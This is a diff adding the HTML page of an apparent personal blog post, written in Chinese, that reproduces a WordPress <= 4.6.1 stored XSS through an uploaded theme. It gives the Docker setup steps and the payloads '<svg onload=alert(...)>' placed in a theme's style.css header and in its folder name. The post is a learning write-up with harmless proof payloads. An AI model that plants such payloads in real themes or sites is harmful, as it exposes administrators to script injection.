@@ -1,0 +1,161 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Wordpress &lt;= 4.6.1 Stored XSS Via Theme File | fanson&#39;s Blog</title>
+
+  
+  <meta name="author" content="fanson">
+  
+
+  
+  <meta name="description" content="Wordpress &amp;lt;= 4.6.1 Stored XSS 漏洞复现
+
+我多想再见你哪怕匆匆一眼
+
+​    发现自己对web漏洞的一些点理解的还是不够深。所以准备复现一波web漏洞，加深自己对一些点的理解深度和巩固下知识！
+0x00 漏洞概述
+​    首先，我们来了解下wordresss，">
+  
+
+  
+  
+  <meta name="keywords" content="websec">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Wordpress &lt;= 4.6.1 Stored XSS Via Theme File"/>
+
+  <meta property="og:site_name" content="fanson&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">fanson&#39;s Blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Wordpress &lt;= 4.6.1 Stored XSS Via Theme File</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-23T10:16:44.000Z">
+          2019-03-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><em>Wordpress &lt;= 4.6.1 Stored XSS 漏洞复现</em></p>
+<blockquote>
+<p>我多想再见你<br>哪怕匆匆一眼</p>
+</blockquote>
+<p>​    发现自己对web漏洞的一些点理解的还是不够深。所以准备复现一波web漏洞，加深自己对一些点的理解深度和巩固下知识！</p>
+<p>0x00 漏洞概述</p>
+<p>​    首先，我们来了解下<code>wordresss</code>，<a href="https://wordpress.org/" target="_blank" rel="noopener">WordPress</a>是一个以<code>PHP</code>和<code>MySQL</code>为平台的自由开源的博客软件和内容管理系统，<code>WordPress</code>具有插件架构和模板系统，截至2018年4月，排名前1000万的网站超过30.6%使用<code>WordPress</code><a href="https://zh.wikipedia.org/wiki/WordPress#cite_note-6" target="_blank" rel="noopener">[1]</a>。<code>WordPress</code>是最受欢迎的网站<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">内容管理系统</a>，<code>WordPress</code>在最着名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</p>
+<p>​    <code>WordPress</code>用户可以安装和切换主题。主题可让用户不改变博客内容和结构的情况下更改界面和<code>WordPress</code>站点的功能。主题可以在<code>WordPress</code>的“外观”管理工具中安装，或者通过<code>FTP</code>上传至主题文件夹。也可以通过编辑主题中的<code>PHP</code>和<code>HTML</code>代码自定义主题。而漏洞是一个后台存储型<code>XSS</code>漏洞，可以通过上传恶意构造的主题文件来触发。【上述内容来自维基百科】</p>
+<p>0x01 环境搭建</p>
+<p>​    本来这个环境是很容易的搭的啊，但刚开始就是一直报错，到最后一直改了又改，最终还是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: Cannot link to a non running container</span><br></pre></td></tr></table></figure>
+<p>到最后一直改了又改，最终还是报错，无奈重新搭建，果然重建是第一生产力。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 0027a12dab6d /bin/bash  </span><br><span class="line">vim /etc/mysql/conf.d/mysql.cnf</span><br><span class="line">Redhat停止防火墙：service iptables stop</span><br><span class="line">Ubuntu停止防火墙：ufw disable</span><br></pre></td></tr></table></figure>
+<p>最后终于搭建完成，命令如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull wordpress:4.6.1</span><br><span class="line">docker pull mysql</span><br><span class="line">docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=fans0n -d mysql</span><br><span class="line">docker run --name wp-wordpress --link wp-mysql:mysql -p 8080:80 -d wordpress:4.6.1</span><br></pre></td></tr></table></figure>
+<p>0x02 漏洞复现</p>
+<p>​    首先，我们先下载一个主题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.wordpress.org/theme/illdy.1.0.29.zip</span><br><span class="line">unzip -x illdy.1.0.29.zip</span><br></pre></td></tr></table></figure>
+<p>​    并且对其<code>illdy/style.css</code>进行如下更改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Theme Name: &lt;svg onload=alert(1234)&gt;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme-n.PNG" alt=""></p>
+<p>​    接着更改文件夹名字再打包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv illdy &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br><span class="line">zip -r theme.zip &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>​    <img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme.PNG" alt=""><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/themeChange.PNG" alt=""></p>
+<p>​    构造好之后我们登录后台上传该主题文件，同时开始动态调试。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/websec/">websec</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 fanson
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
